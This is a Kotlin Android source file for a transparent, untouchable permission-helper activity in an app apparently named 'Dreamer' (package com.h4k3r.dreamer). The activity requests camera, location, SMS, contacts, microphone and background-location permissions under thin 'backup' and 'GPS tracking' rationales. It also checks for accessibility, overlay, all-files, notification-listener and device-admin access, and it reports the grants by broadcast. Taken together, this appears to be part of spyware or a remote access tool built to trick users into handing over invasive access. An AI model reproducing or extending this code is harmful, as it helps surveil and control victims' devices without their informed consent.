package com.h4k3r.dreamer

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class PermissionHelperActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "PermissionHelper"
        private const val REQUEST_CODE_PERMISSION = 1001
    }

    private var permissionType: String? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Remove setContentView to allow system permission dialog to take focus
        // The transparent theme will handle the background

        // Make activity transparent and not show in recents
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
        }

        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
        )

        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )

        // Set transparent background
        window.setBackgroundDrawableResource(android.R.color.transparent)

        handleIntent()
    }

    private fun handleIntent() {
        // Remove all code that handles special permissions (target_intent, special permission checks, etc.)
        // Only keep runtime permission logic (requestPermissions, rationale, etc.)
        val permission = intent.getStringExtra("runtime_permission") ?: ""
        permissionType = intent.getStringExtra("permission")

        if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
            // Show rationale
            showRationale(permission)
        }

        ActivityCompat.requestPermissions(
            this,
            arrayOf(permission),
            REQUEST_CODE_PERMISSION
        )
    }

    private fun showHelperMessage(permissionType: String?) {
        val message = when (permissionType) {
            "accessibility" -> "Please find 'Dreamer' in the list and enable it"
            "all_files_access" -> "Please toggle ON the 'Allow access to all files' switch"
            "overlay" -> "Please toggle ON the 'Allow display over other apps' switch"
            "notification_listener" -> "Please find 'Dreamer' and enable notification access"
            "device_admin" -> "Please tap 'Activate' to enable device admin"
            else -> "Please grant the requested permission"
        }

        Toast.makeText(this, message, Toast.LENGTH_LONG).show()

        // Show another toast after delay
        handler.postDelayed({
            Toast.makeText(this, "📱 Look for the permission dialog", Toast.LENGTH_SHORT).show()
        }, 2000)
    }

    private fun showRationale(permission: String) {
        val rationale = when {
            permission.contains("CAMERA") -> "Camera access is needed for photo/video capture"
            permission.contains("LOCATION") -> "Location access is needed for GPS tracking"
            permission.contains("CONTACTS") -> "Contacts access is needed to backup your contacts"
            permission.contains("SMS") -> "SMS access is needed to backup messages"
            permission.contains("STORAGE") || permission.contains("MEDIA") ->
                "Storage access is needed to manage files"
            permission.contains("RECORD_AUDIO") -> "Microphone access is needed for audio recording"
            permission.contains("PHONE") -> "Phone access is needed for device information"
            permission.contains("POST_NOTIFICATIONS") -> "Notification access is needed to show alerts"
            permission.contains("ACCESS_BACKGROUND_LOCATION") -> "Background location is needed for full location features"
            else -> "This permission is required for the app to function properly"
        }

        Toast.makeText(this, rationale, Toast.LENGTH_LONG).show()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE_PERMISSION) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }

            if (allGranted) {
                Toast.makeText(this, "✅ Permission granted!", Toast.LENGTH_SHORT).show()
            } else {
                // Check if permanently denied
                val permanentlyDenied = permissions.any { permission ->
                    !ActivityCompat.shouldShowRequestPermissionRationale(this, permission) &&
                            ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
                }

                if (permanentlyDenied) {
                    // Guide to settings
                    Toast.makeText(
                        this,
                        "⚠️ Permission denied. Please enable in Settings → Apps → Dreamer → Permissions",
                        Toast.LENGTH_LONG
                    ).show()

                    handler.postDelayed({
                        openAppSettings()
                    }, 2000)
                }
            }

            finishAndReport(allGranted)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        // Remove all code that handles special permissions (target_intent, special permission checks, etc.)
        // Only keep runtime permission logic (requestPermissions, rationale, etc.)
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabledServices = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        return enabledServices.contains(packageName)
    }

    private fun isAllFilesAccessGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= 30) {
            android.os.Environment.isExternalStorageManager()
        } else true
    }

    private fun isOverlayGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.provider.Settings.canDrawOverlays(this)
        } else true
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val enabledListeners = android.provider.Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        ) ?: return false

        return enabledListeners.contains(packageName)
    }

    private fun isDeviceAdminEnabled(): Boolean {
        val devicePolicyManager = getSystemService(android.app.admin.DevicePolicyManager::class.java)
        val componentName = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
        return devicePolicyManager?.isAdminActive(componentName) ?: false
    }

    private fun openAppSettings() {
        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }

        try {
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open app settings", e)
        }
    }

    private fun finishAndReport(success: Boolean) {
        // Report back to SmartPermissionManager via broadcast or callback
        val resultIntent = Intent("com.h4k3r.dreamer.PERMISSION_RESULT").apply {
            putExtra("permission", permissionType)
            putExtra("granted", success)
        }
        sendBroadcast(resultIntent)

        finish()
        overridePendingTransition(0, 0)
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}